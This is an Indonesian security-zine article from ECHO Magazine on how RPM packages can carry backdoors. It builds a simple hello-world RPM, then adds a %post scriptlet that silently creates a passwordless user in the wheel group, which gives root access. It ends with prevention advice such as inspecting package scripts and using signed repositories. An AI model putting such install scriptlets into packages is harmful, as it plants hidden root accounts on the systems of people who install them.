@@ -1,0 +1,205 @@
+                                                
+              .;               .-.              
+  .-.  .-.    ;;-. .-..-.      `-' . ,';.  .-.  
+.;.-' ;      ;;  ;;   ;' ;.   ;'   ;;  ;;.;.-'  
+ `:::'`;;;;'.;`  ``;;'(   ;_.;:._.';  ;;  `:::' 
+                       `-'        ;    `.       
+ECHO MAGAZINE VOLUME IX, ISSUE XXIV, PHILE 0x04.TXT
+
+RPM as backdoor - Mulyadi Santosa 
+mulyadi/dot/santosa/at/gmail/dot/com
+
+
+      RPM (Redhat Package Manager) adalah format paket yang dipakai pada
+distro Redhat dan turunannya. Ada yang berisi binary (aplikasi siap
+dijalankan), ada juga yang berisi source code. Yang kedua ini sering
+juga disebut source RPM (SRPM) dan harus dikompilasi dulu untuk
+menghasilkan binary RPM.
+
+      RPM atau bentuk paket lain berpotensi menjadi celah keamanan. Ini
+disebabkan karena proses instalasi berjalan dalam keadaan privilege
+root. Dengan demikian, memungkinkan bagi RPM untuk disisipi script 
+berpotensi merusak sistem.
+
+Sebagai permulaan, kita lihat dahulu contoh pembuatan RPM binary
+berikut.
+
+Kita mulai dengan instalasi tool untuk membantu dalam pembuatan RPM:
+# yum install rpmdevtools
+
+Lanjut dengan kita persiapkan dulu struktur direktori untuk pembentukan
+RPM.
+Perhatikan bahwa kita tidak perlu menjadi root:
+
+
+$ rpmdev-setuptree
+
+$ tree -aFq ~/rpmbuild/
+rpmbuild/
+├── BUILD/
+├── RPMS/
+├── SOURCES/
+├── SPECS/
+└── SRPMS/
+
+5 directories, 0 files
+
+      Kita pindah ke direktori untuk pembuatan spesifikasi RPM:
+$ cd rpmbuild/SPECS
+File yang kita buat ini nantinya berfungsi menjadi semacam metadata bagi
+RPM itu sendiri. 
+
+      Untuk mempercepat pembuatan file spec, kita bisa pergunakan suatu
+perintah untuk menghasilkan suatu template:
+$ rpmdev-newspec 
+Skeleton specfile (minimal) has been created to "newpackage.spec".
+
+      Kita namai ulang file newpackage.spec menjadi hello.spec. Nama
+"hello" akan menjadi nama RPM kita. Jadi aturannya adalah nama file spec
+sama dengan nama file RPM.
+
+Isi file hello.spec sebagai berikut:
+
+---------------------------------------------------------------------
+$ cat hello.spec
+
+Name: hello
+Version:   1.0     
+Release:        1%{?dist}
+Summary:      A Hello World program :)  
+
+Group:         Applications/File 
+License:        GPLv2
+Source0:        hello
+%{_tmppath}/%{name}-%{version}-%{release}-root-%(%{__id_u} -n)
+
+%description
+This is just a simple testing RPM :)
+
+%prep
+
+%build
+
+%install
+
+%clean
+
+%files
+%defattr(-,root,root,-)
+/usr/bin/hello
+
+%doc
+
+%changelog
+---------------------------------------------------------------------
+
+Untuk programnya, kita buat dari source code sederhana berikut:
+
+---------------------------------------------------------------------
+$ cat hello.c
+
+#include<stdio.h>
+
+void main()
+{
+        printf("hello world from rpm\n");
+
+}
+
+---------------------------------------------------------------------
+
+Compile source diatas:
+$ gcc -o hello hello.c
+Kita anggap file "hello" awalnya disimpan di direktori /tmp.
+
+      Lalu letakkan pada direktori di bawah BUILDROOT. Sebelumnya buat
+dulu direktori yang sesuai:
+$ cd ~/rpmbuild/BUILDROOT
+$ mkdir -p hello-1.0-1.el6.i386/usr/bin/
+$ cp /tmp/hello hello-1.0-1.el6.i386/usr/bin/
+
+      Bagaimana kita tahu struktur nama direktori diatas? Jika dipilah
+satu persatu, nama diatas didapat dari gabungan [[nama paket
+]]-[[version]]-[[release]]-[[arsitektur]]. Jadi berturut-turut di dapat:
+hello-1.0-1.el6.i386
+Untuk kata "el6.i386" ini bisa berbeda sesuai dengan distro dan
+arsitektur prosesor. String ini bisa dilihat dari output "uname -r".
+Jadi misalnya:
+$ uname -r
+2.6.32-71.el6.i686
+maka berarti isi string release diakhiri dengan "el6" dan arsitektur
+adalah i386 (prosesor intel berbasis 80x86).
+
+      Kini kita berpindah ke direktori SPECS dan memulai pembuatan
+paket RPM:
+$ rpmbuild -bb hello.spec
+Jika tidak ada masalah, akan ada file rpm baru di direktori
+~/rpmbuild/RPMS/i386 dengan nama hello-1.0-1.el6.i386.rpm.
+
+      Instalasi langsung dilakukan dengan perintah:
+$ cd ~/rpmbuild/RPMS/i386
+$ sudo rpm -Uvh hello-1.0-1.el6.i386.rpm
+
+File binary hello yang kita buat sudah berada pada direktori binary:
+$ ls -l /usr/bin/hello 
+-rwxrwxr-x. 1 root root 4588 Oct 30 18:15 /usr/bin/hello
+
+Sampai disini RPM yang kita buat tidak menimbulkan masalah apapun.
+Namun ada bagian yang bisa disalah gunakan, yaitu scripting yang
+disisipkan pada bagian %post (setelah instalasi), %pre (sebelum
+instalasi) dan seterusnya. Sebagai contoh, coba edit file
+hello.spec sehingga sekarang terbaca seperti dibawah ini.
+........
+%clean
+
+%post
+useradd -M -g wheel test &>/dev/null
+passwd -d test &>/dev/null
+
+%files
+.......
+
+Ulangi kembali pembuatan RPM dengan perintah "rpmbuild -bb". Dan
+lakukan instalasi.
+
+Kali ini, sembari melakukan instalasi, akan dibuat user bernama "test"
+yang dimasukkan dalam group wheel. User ini juga diset tidak memiliki
+password. Kenapa ini bermasalah? Ada dua alasan:
+a. Group wheel sering dibuat menjadi group tempat bernaungnya user-user
+yang memiliki hak menjalankan perintah sudo
+b. User tidak memiliki password.
+
+faktor a dan b, otomatis anda mendapat akses root! Jika anda memiliki
+akses fisik ke mesin yang melakukan instalasi RPM ini, artinya anda
+bisa menjadi root dengan relatif mudah. Atau jika komputer ini aktif
+service SSH nya, maka juga dengan mudah ditembus dan dengan cepat kita
+bisa menjadikan diri kita root
+
+
+Pencegahan:
+
+a. Usahakan mengecek isi suatu file RPM sebelum instalasi dengan
+perintah:
+$ rpm -qpi --scripts hello-1.0-1.el6.i386.rpm 
+....
+postinstall scriptlet (using /bin/sh):
+useradd -M -g wheel test &>/dev/null
+passwd -d test &>/dev/null
+
+^^^^ Awasi bagian postinstall dan sejenisnya dari perintah-perintah
+yang berpotensi menimbulkan masalah
+
+b. Hanya install dari repository terpercaya yang memiliki GPG sign,
+semisal rpmforge atau EPEL
+
+c. backup, backup, backup. Jadi jika terjadi masalah, anda memiliki
+kesempatan untuk roll back dan tidak sampai terjadi masalah kehilangan
+data!
+
+Referensi:
+How to create an RPM package
+http://fedoraproject.org/wiki/How_to_create_an_RPM_package
+
+Shouts:
+- Echostaff: y3d1ps, az001, k-159, th3_d4y, lirva32
+- the rest of echo community :)
